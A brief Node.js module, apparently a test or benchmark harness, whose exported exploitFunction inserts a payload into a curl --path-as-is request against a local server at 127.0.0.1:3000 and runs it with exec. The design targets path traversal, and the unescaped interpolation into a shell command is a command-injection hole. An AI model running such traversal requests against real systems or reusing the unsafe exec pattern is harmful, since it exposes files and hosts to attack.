const path = require("path");
const { exec } = require("child_process");

function exploitFunction(payload) {
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:3000/f/${payload}"`;
  return new Promise((resolve, reject) => {
    exec(attack_string, (error, stdout) => {
      if (error) {
        reject(error);
      } else {
        resolve(stdout);
      }
    });
  });
}

module.exports = { exploitFunction };